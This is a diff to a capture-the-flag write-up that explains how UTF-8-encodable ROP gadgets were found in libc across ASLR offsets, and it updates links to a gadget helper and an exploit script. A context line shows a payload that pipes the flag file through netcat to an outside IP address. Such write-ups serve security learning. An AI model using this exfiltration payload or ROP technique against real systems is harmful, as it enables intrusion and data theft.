@@ -266,7 +266,7 @@ The processor is compiled with ASLR, but we recall from the `S99start` script, t
 
 When trying to find gadgets that are UTF-8 encodable, it is imortant to understand how UTF-8 works. The 1-byte UTF-8 range is from `0x00-0x7f`. This will most likely not be enough to encode meaningful gadgets. But there is also 2, 3, and 4 byte UTF-8 characters. Those allow to encode 1 to 2 arbitrary bytes, while clobbering the next byte. Have a look at [UTF-8 Wikipedia](https://en.wikipedia.org/wiki/UTF-8) for a better explanation.
 
-There is multiple ways to find gadgets now. My approach was to run ropper on `libc` to create extract all gadgets first. Afterwards, I wrote a small script [TODO Gadget helper]() that adds all 1024 ASLR offsets to the gadgets. For each offset it checks for each gadget if it is UTF-8 encodable. If so, it writes the gadgets to a new file. To reduce the number of files, I excluded ALSR offsets, where `system` was not UTF-8 encodable. 
+There is multiple ways to find gadgets now. My approach was to run ropper on `libc` to create extract all gadgets first. Afterwards, I wrote a small script [gadget helper.py](gadget_helper.py) that adds all 1024 ASLR offsets to the gadgets. For each offset it checks for each gadget if it is UTF-8 encodable. If so, it writes the gadgets to a new file. To reduce the number of files, I excluded ALSR offsets, where `system` was not UTF-8 encodable. 
 
 I then came up with the following gadget chain at ALSR offset 32:
 ```python
@@ -289,6 +289,6 @@ payload += b"B"*16
 payload += b"cat /flag | nc 167.71.33.163 1"
 ```
 
-Finally, I just had to run the exploit in a loop until my desired ASLR offset appeared. See [./exploit.py]() for the full exploit script.
+Finally, I just had to run the exploit in a loop until my desired ASLR offset appeared. See [exploit.py](exploit.py) for the full exploit script.
 
 Congrats to the 6 teams that solved the challenge!
